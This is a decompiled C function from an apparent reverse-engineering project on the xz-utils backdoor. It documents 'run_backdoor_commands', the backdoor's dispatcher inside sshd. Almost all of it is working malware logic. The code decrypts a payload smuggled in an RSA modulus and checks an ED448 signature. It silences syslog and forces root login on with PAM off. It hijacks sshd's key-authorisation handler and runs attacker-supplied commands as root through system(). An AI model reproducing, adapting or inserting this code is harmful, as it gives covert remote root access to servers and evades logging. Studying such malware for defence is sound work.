// /home/kali/xzre-ghidra/xzregh/1094A0_run_backdoor_commands.c
// Function: run_backdoor_commands @ 0x1094A0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall run_backdoor_commands(RSA * key, global_context_t * ctx, BOOL * do_orig)


/*
 * AutoDoc: Central dispatcher invoked from the RSA hooks: it parses the forged modulus, decrypts staged payload chunks, verifies the ED448 signature, toggles sshd configuration/logging, and, if necessary, escalates through `sshd_proxy_elevate`. Every command the backdoor accepts flows through this routine before control returns to libcrypto.
 */
#include "xzre_types.h"


BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)

{
  imported_funcs_t *piVar1;
  pfn_RSA_get0_key_t ppVar2;
  pfn_BN_num_bits_t ppVar3;
  libc_imports_t *plVar4;
  sensitive_data *psVar5;
  sshkey **ppsVar6;
  u8 *puVar7;
  pfn_setlogmask_t ppVar8;
  sshd_ctx_t *psVar9;
  uint *puVar10;
  long *plVar11;
  pfn_exit_t ppVar12;
  byte bVar13;
  uint uVar14;
  int iVar15;
  BOOL BVar16;
  int iVar17;
  uid_t uVar18;
  int iVar19;
  ulong uVar20;
  int *piVar21;
  ssize_t sVar22;
  BIGNUM *e;
  BIGNUM *n;
  long lVar23;
  byte bVar24;
  uint uVar25;
  u64 sshkey_digest_offset;
  ulong uVar26;
  ulong uVar27;
  undefined1 uVar28;
  gid_t rgid;
  uid_t *puVar29;
  fd_set *pfVar30;
  u8 **ppuVar31;
  undefined4 *puVar32;
  byte bVar33;
  long lVar34;
  ulong uVar35;
  ulong uVar36;
  u8 *ed448_raw_key;
  byte bVar37;
  run_backdoor_commands_data_t f;
  u64 cmd_type;
  u8 *data_ptr;
  BOOL sigcheck_result;
  int key_idx;
  int data_offset;
  u16 *size_location;
  u64 delta;
  u8 *signature;
  int num_n_bits;
  sshd_offsets_t offsets;
  int hostkey_hash_offset;
  undefined4 uStack_59c;
  sshd_offsets_t tmp;
  undefined4 uStack_594;
  undefined8 local_590;
  undefined8 uStack_588;
  int body_size;
  undefined1 local_550 [16];
  u8 *extra_data;
  u8 *data_ptr2;
  u64 data_index;
  int rsa_n_length;
  u32 v;
  int body_offset;
  int size;
  uid_t tgt_uid;
  uid_t tgt_gid;
  undefined1 local_2e0 [7];
  u8 auStack_2d9 [2];
  uint uStack_2d7;
  long lStack_2d3;
  int data_s1;
  int num_n_bytes;
  int data_s2;
  undefined8 local_83;
  long lStack_7b;
  int payload_size;
  
  bVar37 = 0;
  puVar29 = &tgt_uid;
  for (lVar23 = 0xae; lVar23 != 0; lVar23 = lVar23 + -1) {
    *puVar29 = 0;
    puVar29 = puVar29 + 1;
  }
  if (ctx != (global_context_t *)0x0) {
    if ((((ctx->disable_backdoor == FALSE) && (key != (RSA *)0x0)) &&
        (piVar1 = ctx->imported_funcs, piVar1 != (imported_funcs_t *)0x0)) &&
       ((ppVar2 = piVar1->RSA_get0_key, ppVar2 != (pfn_RSA_get0_key_t)0x0 &&
        (piVar1->BN_bn2bin != (pfn_BN_bn2bin_t)0x0)))) {
      if (do_orig == (BOOL *)0x0) {
        ctx->disable_backdoor = TRUE;
        return FALSE;
      }
      *do_orig = TRUE;
      (*ppVar2)(key,(BIGNUM **)&tgt_uid,(BIGNUM **)&tgt_gid,(BIGNUM **)0x0);
      if ((((_tgt_uid != (BIGNUM *)0x0) && (_tgt_gid != (BIGNUM *)0x0)) &&
          ((ctx->imported_funcs != (imported_funcs_t *)0x0 &&
           (((ppVar3 = ctx->imported_funcs->BN_num_bits, ppVar3 != (pfn_BN_num_bits_t)0x0 &&
             (uVar14 = (*ppVar3)(_tgt_uid), uVar14 < 0x4001)) &&
            (uVar14 = uVar14 + 7 >> 3, uVar14 - 0x14 < 0x205)))))) &&
         (iVar15 = (*ctx->imported_funcs->BN_bn2bin)(_tgt_uid,local_2e0 + 5), -1 < iVar15)) {
        uVar35 = (ulong)uVar14;
        if ((ulong)(long)iVar15 <= uVar35) {
          if ((ulong)(long)iVar15 < 0x11) goto LAB_0010a11a;
          if (((CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) == 0) || (uStack_2d7 == 0)) ||
             (uVar27 = (ulong)CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) * (ulong)uStack_2d7 +
                       lStack_2d3, 3 < uVar27)) goto LAB_0010a11a;
          plVar4 = ctx->libc_imports;
          if (((plVar4 != (libc_imports_t *)0x0) && (plVar4->getuid != (pfn_getuid_t)0x0)) &&
             ((plVar4->exit != (pfn_exit_t)0x0 &&
              ((ctx->sshd_log_ctx != (sshd_log_ctx_t *)0x0 && (ctx->num_shifted_bits == 0x1c8))))))
          {
            local_83 = CONCAT44(uStack_2d7,CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25));
            lStack_7b = lStack_2d3;
            BVar16 = secret_data_get_decrypted((u8 *)&payload_size,ctx);
            if ((BVar16 != FALSE) &&
               (BVar16 = chacha_decrypt((u8 *)&data_s1,uVar14 - 0x10,(u8 *)&payload_size,
                                        (u8 *)&local_83,(u8 *)&data_s1,ctx->imported_funcs),
               BVar16 != FALSE)) {
              *(u64 *)local_550 = 0;
              *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
              piVar21 = &payload_size;
              for (lVar23 = 0x39; lVar23 != 0; lVar23 = lVar23 + -1) {
                *(u8 *)piVar21 = '\0';
                piVar21 = (int *)((long)piVar21 + (ulong)bVar37 * -2 + 1);
              }
              local_590 = 0;
              uStack_588 = 0;
              ppuVar31 = &extra_data;
              for (lVar23 = 0x93; lVar23 != 0; lVar23 = lVar23 + -1) {
                *(undefined4 *)ppuVar31 = 0;
                ppuVar31 = (u8 **)((long)ppuVar31 + (ulong)bVar37 * -8 + 4);
              }
              psVar5 = ctx->sshd_sensitive_data;
              piVar21 = &body_size;
              for (lVar23 = 0x29; lVar23 != 0; lVar23 = lVar23 + -1) {
                *(undefined1 *)piVar21 = 0;
                piVar21 = (int *)((long)piVar21 + (ulong)bVar37 * -2 + 1);
              }
              if ((((psVar5 != (sensitive_data *)0x0) && (psVar5->host_pubkeys != (sshkey **)0x0))
                  && (ctx->imported_funcs != (imported_funcs_t *)0x0)) && (0x71 < uVar35 - 0x10)) {
                iVar15 = (int)uVar27;
                *(int *)local_550 = iVar15;
                if (4 < uVar35 - 0x82) {
                  local_2e0[0] = (byte)num_n_bytes;
                  local_2e0[1] = (byte)((uint)num_n_bytes >> 8);
                  local_2e0[2] = (byte)((uint)num_n_bytes >> 0x10);
                  local_2e0[3] = (byte)((uint)num_n_bytes >> 0x18);
                  stack0xfffffffffffffd24 = CONCAT31(stack0xfffffffffffffd25,(undefined1)data_s2);
                  cmd_type = uVar35 - 0x87;
                  if (uVar27 == 2) {
                    uVar20 = (ulong)CONCAT11((undefined1)data_s2,local_2e0[3]);
                    if ((char)local_2e0[0] < '\0') {
                      if (CONCAT11((undefined1)data_s2,local_2e0[3]) != 0) goto LAB_0010a112;
                      uVar26 = 0;
                      uVar20 = 0x39;
                      ed448_raw_key = (u8 *)((long)&data_s2 + 1);
                      lVar23 = 0;
                    }
                    else {
                      if ((num_n_bytes & 0x100U) != 0) {
                        uVar20 = uVar20 + 8;
                      }
                      ed448_raw_key = (u8 *)0x0;
                      lVar23 = 0x87;
                      uVar26 = uVar20;
                    }
                    if (cmd_type < uVar20) goto LAB_0010a112;
                    _key_idx = uVar20 + 5;
                    cmd_type = cmd_type - uVar20;
                    uVar36 = uVar20 + 0x87;
                    iVar17 = (int)uVar20 + 4;
                  }
                  else if ((iVar15 == 3) && ((num_n_bytes & 0x4000U) == 0)) {
                    if (cmd_type < 0x30) goto LAB_0010a112;
                    uVar26 = 0x30;
                    lVar23 = 0x87;
                    ed448_raw_key = (u8 *)0x0;
                    _key_idx = 0x35;
                    uVar36 = 0x87;
                    iVar17 = 0x34;
                  }
                  else {
                    uVar26 = 0;
                    lVar23 = 0;
                    uVar36 = 0x87;
                    ed448_raw_key = (u8 *)0x0;
                    _key_idx = 5;
                    iVar17 = 4;
                  }
                  piVar21 = &num_n_bytes;
                  puVar32 = (undefined4 *)(local_550 + 4);
                  for (uVar20 = (ulong)(iVar17 + 1); uVar20 != 0; uVar20 = uVar20 - 1) {
                    *(char *)puVar32 = (char)*piVar21;
                    piVar21 = (int *)((long)piVar21 + (ulong)bVar37 * -2 + 1);
                    puVar32 = (undefined4 *)((long)puVar32 + (ulong)bVar37 * -2 + 1);
                  }
                  stack0xfffffffffffffa60 = 0;
                  ppsVar6 = psVar5->host_keys;
                  _tmp = 0;
                  if (((ppsVar6 != (sshkey **)0x0) && (psVar5->host_pubkeys != (sshkey **)0x0)) &&
                     ((ppsVar6 != psVar5->host_pubkeys &&
                      (((((uint)psVar5->have_ssh2_key < 2 &&
                         (BVar16 = count_pointers(ppsVar6,(u64 *)((long)&hostkey_hash_offset + 1),
                                                  ctx->libc_imports), BVar16 != FALSE)) &&
                        (BVar16 = count_pointers(ctx->sshd_sensitive_data->host_pubkeys,(u64 *)&tmp,
                                                 ctx->libc_imports),
                        uVar20 = stack0xfffffffffffffa60, BVar16 != FALSE)) &&
                       (stack0xfffffffffffffa60 == _tmp)))))) {
                    BVar16 = secret_data_get_decrypted((u8 *)&local_590,ctx);
                    if (BVar16 != FALSE) {
                      lVar34 = 0;
                      do {
                        *(uint *)&signature = (uint)uVar20;
                        uVar14 = (uint)lVar34;
                        if ((uint)signature <= uVar14) goto LAB_0010a112;
                        BVar16 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[lVar34],
                                                  local_550,_key_idx + 4,0x25c,(u8 *)&data_s1,
                                                  (u8 *)&local_590,ctx);
                        lVar34 = lVar34 + 1;
                      } while (BVar16 == FALSE);
                      ctx->sshd_host_pubkey_idx = uVar14;
                      if ((uVar27 != 2) || (-1 < (char)local_2e0[0])) {
                        if (lVar23 == 0) {
LAB_00109a97:
                          if (uVar36 <= uVar35) goto LAB_00109aa2;
                        }
                        else {
                          uVar36 = 0x87;
LAB_00109aa2:
                          if (uVar26 <= uVar35 - uVar36) {
                            if ((((local_2e0[0] & 4) == 0) ||
                                (ctx->libc_imports == (libc_imports_t *)0x0)) ||
                               (ppVar8 = ctx->libc_imports->setlogmask,
                               ppVar8 == (pfn_setlogmask_t)0x0)) {
                              ctx->sshd_log_ctx->syslog_disabled = FALSE;
                              if ((local_2e0[0] & 5) == 5) goto LAB_0010a1ba;
                            }
                            else {
                              (*ppVar8)(-0x80000000);
                              ctx->sshd_log_ctx->syslog_disabled = TRUE;
                            }
                            uVar18 = (*ctx->libc_imports->getuid)();
                            bVar13 = local_2e0[0];
                            ctx->uid = uVar18;
                            bVar33 = local_2e0[0] & 0x10;
                            if (((bVar33 == 0) || (ctx->sshd_log_ctx->log_hooking_possible != FALSE)
                                ) && (((local_2e0[0] & 2) == 0 ||
                                      ((BVar16 = sshd_configure_log_hook
                                                           ((cmd_arguments_t *)local_2e0,ctx),
                                       BVar16 != FALSE || (bVar33 == 0)))))) {
                              if (uVar27 == 0) {
                                if (((char)local_2e0[1] < '\0') ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
                                  bVar33 = 0xff;
                                  if ((local_2e0[1] & 2) != 0) {
                                    bVar33 = (byte)(CONCAT11(local_2e0[3],local_2e0[2]) >> 6) & 0x7f
                                    ;
                                  }
                                  bVar24 = 0xff;
                                  if ((char)bVar13 < '\0') {
                                    bVar24 = (byte)(((ulong)CONCAT41(stack0xfffffffffffffd24,
                                                                     local_2e0[3]) << 0x18) >> 0x1d)
                                             & 0x1f;
                                  }
                                  uVar14 = (uint)CONCAT11(bVar24,bVar33);
                                  if ((local_2e0[1] & 4) == 0) {
LAB_00109c56:
                                    uVar14 = uVar14 | 0xff0000;
                                    uVar25 = 0xff;
                                  }
                                  else {
                                    uVar25 = (uint)((byte)local_2e0[4] >> 5);
                                    uVar14 = uVar14 | ((byte)local_2e0[4] >> 2 & 7) << 0x10;
                                  }
LAB_00109c7b:
                                  uVar14 = uVar14 | uVar25 << 0x18;
LAB_00109c8a:
                                  (ctx->sshd_offsets).field0_0x0.raw_value = uVar14;
                                  puVar29 = (uid_t *)(local_2e0 + uVar36 + 5);
                                  if (uVar18 == 0) {
                                    plVar4 = ctx->libc_imports;
                                    if ((((plVar4 != (libc_imports_t *)0x0) &&
                                         (plVar4->setresgid != (pfn_setresgid_t)0x0)) &&
                                        (plVar4->setresuid != (pfn_setresuid_t)0x0)) &&
                                       (plVar4->system != (pfn_system_t)0x0)) {
                                      if (uVar27 == 0) {
                                        psVar9 = ctx->sshd_ctx;
                                        if (((psVar9 != (sshd_ctx_t *)0x0) &&
                                            (psVar9->mm_answer_keyallowed_ptr != (void *)0x0)) &&
                                           (psVar9->have_mm_answer_keyallowed != FALSE)) {
                                          if ((char)local_2e0[1] < '\0') goto LAB_00109d36;
                                          piVar21 = psVar9->permit_root_login_ptr;
                                          if (piVar21 != (int *)0x0) {
                                            iVar15 = *piVar21;
                                            if (iVar15 < 3) {
                                              if (-1 < iVar15) {
                                                *piVar21 = 3;
LAB_00109d36:
                                                if ((bVar13 & 0x40) != 0) {
                                                  puVar10 = (uint *)psVar9->use_pam_ptr;
                                                  if ((puVar10 == (uint *)0x0) || (1 < *puVar10))
                                                  goto LAB_0010a1ba;
                                                  *puVar10 = 0;
                                                }
                                                stack0xfffffffffffffa60 =
                                                     CONCAT44(uStack_59c,0xffffffff);
                                                if ((bVar13 & 0x20) == 0) {
                                                  BVar16 = sshd_get_client_socket
                                                                     (ctx,(int *)((long)&
                                                  hostkey_hash_offset + 1),1,DIR_READ);
                                                }
                                                else {
                                                  BVar16 = sshd_get_usable_socket
                                                                     ((int *)((long)&
                                                  hostkey_hash_offset + 1),local_2e0[1] >> 3 & 0xf,
                                                  plVar4);
                                                }
                                                if (BVar16 != FALSE) {
                                                  iVar15 = stack0xfffffffffffffa60;
                                                  *(u8 *)&hostkey_hash_offset = 0;
                                                  _tmp = _tmp & 0xffffffff00000000;
                                                  local_590 = 0;
                                                  uStack_588 = 0;
                                                  if (((-1 < stack0xfffffffffffffa60) &&
                                                      (plVar4 = ctx->libc_imports,
                                                      plVar4 != (libc_imports_t *)0x0)) &&
                                                     ((plVar4->pselect != (pfn_pselect_t)0x0 &&
                                                      (plVar4->__errno_location !=
                                                       (pfn___errno_location_t)0x0)))) {
                                                    iVar17 = stack0xfffffffffffffa60 >> 6;
                                                    uVar35 = 1L << ((byte)stack0xfffffffffffffa60 &
                                                                   0x3f);
                                                    do {
                                                      uStack_588 = 500000000;
                                                      pfVar30 = (fd_set *)local_550;
                                                      for (lVar23 = 0x20; lVar23 != 0;
                                                          lVar23 = lVar23 + -1) {
                                                        *(undefined4 *)pfVar30 = 0;
                                                        pfVar30 = (fd_set *)
                                                                  ((long)pfVar30 +
                                                                  (ulong)bVar37 * -8 + 4);
                                                      }
                                                      *(ulong *)(local_550 + (long)iVar17 * 8) =
                                                           uVar35;
                                                      local_590 = 0;
                                                      iVar19 = (*plVar4->pselect)(iVar15 + 1,
                                                                                  (fd_set *)
                                                                                  local_550,
                                                                                  (fd_set *)0x0,
                                                                                  (fd_set *)0x0,
                                                                                  (timespec *)
                                                                                  &local_590,
                                                                                  (sigset_t *)0x0);
                                                      if (-1 < iVar19) {
                                                        if (((iVar19 != 0) &&
                                                            ((uVar35 & *(ulong *)(local_550 +
                                                                                 (long)iVar17 * 8))
                                                             != 0)) &&
                                                           (sVar22 = fd_read(iVar15,&tmp,4,plVar4),
                                                           -1 < sVar22)) {
                                                          uVar14 = (uint)tmp.field0_0x0 >> 0x18 |
                                                                   ((uint)tmp.field0_0x0 & 0xff0000)
                                                                   >> 8 | ((uint)tmp.field0_0x0 &
                                                                          0xff00) << 8 |
                                                                   (int)tmp.field0_0x0 << 0x18;
                                                          _tmp = CONCAT44(uStack_594,uVar14);
                                                          if ((uVar14 - 1 < 0x41) &&
                                                             (sVar22 = fd_read(iVar15,&
                                                  hostkey_hash_offset,1,plVar4), -1 < sVar22)) {
                                                    ctx->sock_read_buf_size =
                                                         (ulong)((int)tmp.field0_0x0 - 1);
                                                    sVar22 = fd_read(iVar15,ctx->sock_read_buf,
                                                                     (ulong)((int)tmp.field0_0x0 - 1
                                                                            ),plVar4);
                                                    if (-1 < sVar22) {
                                                      psVar9 = ctx->sshd_ctx;
                                                      if (psVar9->mm_answer_keyallowed !=
                                                          (void *)0x0) {
                                                        plVar11 = (long *)psVar9->
                                                  mm_answer_keyallowed_ptr;
                                                  if ((local_2e0[2] & 0x3f) == 0) {
                                                    iVar15 = 0x16;
                                                    if (plVar11 != (long *)0x0) {
                                                      iVar15 = (int)plVar11[-1];
                                                    }
                                                  }
                                                  else {
                                                    iVar15 = (uint)(local_2e0[2] & 0x3f) * 2;
                                                  }
                                                  psVar9->mm_answer_keyallowed_reqtype = iVar15 + 1;
                                                  *plVar11 = (long)psVar9->mm_answer_keyallowed;
                                                  goto LAB_0010a076;
                                                  }
                                                  }
                                                  }
                                                  }
                                                  break;
                                                  }
                                                  piVar21 = (*plVar4->__errno_location)();
                                                  } while (*piVar21 == 4);
                                                  }
                                                }
                                              }
                                            }
                                            else if (iVar15 == 3) goto LAB_00109d36;
                                          }
                                        }
                                      }
                                      else if (iVar15 == 1) {
                                        BVar16 = sshd_patch_variables
                                                           (local_2e0[1] & TRUE,
                                                            local_2e0[0] >> 6 & TRUE,
                                                            local_2e0[1] >> 1 & TRUE,
                                                            (uint)local_2e0[3],ctx);
                                        if (BVar16 != FALSE) {
LAB_0010a076:
                                          local_590 = CONCAT71((local_590 >> 8),1);
                                          *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
                                          ppuVar31 = &extra_data;
                                          for (lVar23 = 0x3c; lVar23 != 0; lVar23 = lVar23 + -1) {
                                            *(undefined4 *)ppuVar31 = 0;
                                            ppuVar31 = (u8 **)((long)ppuVar31 +
                                                              (ulong)bVar37 * -8 + 4);
                                          }
                                          *(u64 *)local_550 = 0x80;
                                          *(u8 *)&body_offset = 8;
                                          *(u8 *)&size = 1;
                                          e = (*ctx->imported_funcs->BN_bin2bn)
                                                        ((uchar *)&local_590,1,(BIGNUM *)0x0);
                                          if (((e != (BIGNUM *)0x0) &&
                                              (n = (*ctx->imported_funcs->BN_bin2bn)
                                                             (local_550,0x100,(BIGNUM *)0x0),
                                              n != (BIGNUM *)0x0)) &&
                                             (iVar15 = (*ctx->imported_funcs->RSA_set0_key)
                                                                 (key,n,e,(BIGNUM *)0x0),
                                             iVar15 == 1)) goto LAB_0010a112;
                                        }
                                      }
                                      else if (iVar15 == 2) {
                                        uVar26 = uVar26 & 0xffff;
                                        if ((local_2e0[1] & 1) == 0) {
                                          rgid = 0;
                                          lVar23 = 0;
                                          uVar18 = 0;
                                        }
                                        else {
                                          if (uVar26 < 9) goto LAB_0010a1ba;
                                          uVar18 = *puVar29;
                                          rgid = *(gid_t *)((long)&uStack_2d7 + uVar36);
                                          uVar26 = uVar26 - 8;
                                          lVar23 = 8;
                                        }
                                        if ((char)bVar13 < '\0') {
                                          if (2 < uVar26) {
                                            uVar35 = (ulong)*(ushort *)((long)puVar29 + lVar23);
                                            uVar26 = uVar26 - 2;
                                            lVar23 = lVar23 + 2;
                                            if (uVar26 <= uVar35) goto LAB_00109fb9;
                                          }
                                        }
                                        else {
                                          uVar35 = (ulong)CONCAT11(local_2e0[4],local_2e0[3]);
LAB_00109fb9:
                                          if ((((uVar35 <= uVar26) &&
                                               ((rgid == 0 ||
                                                (iVar15 = (*plVar4->setresgid)(rgid,rgid,rgid),
                                                iVar15 != -1)))) &&
                                              ((uVar18 == 0 ||
                                               (iVar15 = (*ctx->libc_imports->setresuid)
                                                                   (uVar18,uVar18,uVar18),
                                               iVar15 != -1)))) &&
                                             (*(char *)((long)puVar29 + lVar23) != '\0')) {
                                            (*ctx->libc_imports->system)
                                                      ((char *)((long)puVar29 + lVar23));
                                            goto LAB_0010a076;
                                          }
                                        }
                                      }
                                      else if ((((local_2e0[1] & 0xc0) == 0xc0) &&
                                               (plVar4->exit != (pfn_exit_t)0x0)) &&
                                              (plVar4->pselect != (pfn_pselect_t)0x0)) {
                                        *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
                                        *(u64 *)local_550 = 5;
                                        (*plVar4->pselect)(0,(fd_set *)0x0,(fd_set *)0x0,
                                                           (fd_set *)0x0,(timespec *)local_550,
                                                           (sigset_t *)0x0);
                                        (*plVar4->exit)(0);
                                      }
                                    }
                                  }
                                  else {
                                    puVar32 = (undefined4 *)(local_550 + 4);
                                    for (lVar23 = 0xb; lVar23 != 0; lVar23 = lVar23 + -1) {
                                      *puVar32 = 0;
                                      puVar32 = puVar32 + (ulong)bVar37 * -2 + 1;
                                    }
                                    *(cmd_arguments_t **)(local_550 + 8) = local_2e0;
                                    extra_data = (u8 *)_tgt_uid;
                                    data_ptr2 = (u8 *)_tgt_gid;
                                    data_index = (u64)puVar29;
                                    *(u16 *)&rsa_n_length = (short)uVar26;
                                    _v = key;
                                    BVar16 = sshd_proxy_elevate((monitor_data_t *)local_550,ctx);
                                    if (BVar16 != FALSE) {
                                      ctx->disable_backdoor = TRUE;
                                      *do_orig = FALSE;
                                      return TRUE;
                                    }
                                  }
                                }
                              }
                              else if (iVar15 == 1) {
                                if (((local_2e0[1] & 1) != 0) ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0))
                                goto LAB_00109b6c;
                              }
                              else {
                                if (iVar15 != 3) {
LAB_00109b6c:
                                  uVar14 = 0;
                                  goto LAB_00109c8a;
                                }
                                if (((char)local_2e0[3] < '\0') ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
                                  if ((local_2e0[2] & 0x20) != 0) {
                                    uVar28 = 0xff;
                                    if ((char)local_2e0[2] < '\0') {
                                      uVar28 = local_2e0[4];
                                    }
                                    bVar33 = 0xff;
                                    if ((local_2e0[2] & 0x40) != 0) {
                                      bVar33 = local_2e0[3] & 0x3f;
                                    }
                                    uVar14 = (uint)CONCAT11(bVar33,uVar28);
                                    if ((local_2e0[3] & 0x40) == 0) goto LAB_00109c56;
                                    uVar25 = local_2e0[1] >> 3 & 7;
                                    uVar14 = uVar14 | (local_2e0[1] & 7) << 0x10;
                                    goto LAB_00109c7b;
                                  }
                                  uVar14 = 0xffffffff;
                                  goto LAB_00109c8a;
                                }
                              }
                            }
                          }
                        }
LAB_0010a1ba:
                        ctx->disable_backdoor = TRUE;
                        piVar21 = &payload_size;
                        for (lVar23 = 0x39; lVar23 != 0; lVar23 = lVar23 + -1) {
                          *(undefined1 *)piVar21 = 0;
                          piVar21 = (int *)((long)piVar21 + (ulong)bVar37 * -2 + 1);
                        }
                        if ((local_2e0[0] & 1) != 0) {
                          if (ctx->libc_imports == (libc_imports_t *)0x0) {
                            return FALSE;
                          }
                          ppVar12 = ctx->libc_imports->exit;
                          if (ppVar12 == (pfn_exit_t)0x0) {
                            return FALSE;
                          }
                          (*ppVar12)(0);
                          return FALSE;
                        }
                        goto LAB_0010a11a;
                      }
                      if (ed448_raw_key != (u8 *)0x0) {
                        if ((local_2e0[1] & 1) == 0) {
                          lVar23 = 0;
                        }
                        else {
                          lVar23 = 8;
                          if (cmd_type < 9) goto LAB_0010a112;
                        }
                        if (((lVar23 + 2U <= cmd_type) &&
                            (uVar26 = (ulong)*(ushort *)(local_2e0 + uVar36 + lVar23 + 5) +
                                      lVar23 + 2U, uVar26 < cmd_type)) && (0x71 < cmd_type - uVar26)
                           ) {
                          if (((ctx->current_data_size <= ctx->payload_data_size) &&
                              (uVar20 = ctx->payload_data_size - ctx->current_data_size,
                              0x38 < uVar20)) && (uVar26 <= uVar20 - 0x39)) {
                            puVar7 = ctx->payload_data;
                            uVar20 = 0;
                            do {
                              puVar7[uVar20] = local_2e0[uVar20 + uVar36 + 5];
                              uVar20 = uVar20 + 1;
                            } while (uVar26 != uVar20);
                            ppsVar6 = ctx->sshd_sensitive_data->host_pubkeys;
                            sshkey_digest_offset = ctx->current_data_size + uVar26;
                            ctx->current_data_size = sshkey_digest_offset;
                            BVar16 = verify_signature(ppsVar6[ctx->sshd_host_pubkey_idx],
                                                      ctx->payload_data,sshkey_digest_offset,
                                                      ctx->payload_data_size,
                                                      auStack_2d9 + uVar26 + uVar36 + -2,
                                                      ed448_raw_key,ctx);
                            if (BVar16 != FALSE) goto LAB_00109a97;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
LAB_0010a112:
      ctx->disable_backdoor = TRUE;
      goto LAB_0010a11a;
    }
    ctx->disable_backdoor = TRUE;
  }
  if (do_orig == (BOOL *)0x0) {
    return FALSE;
  }
LAB_0010a11a:
  *do_orig = TRUE;
  return FALSE;
}

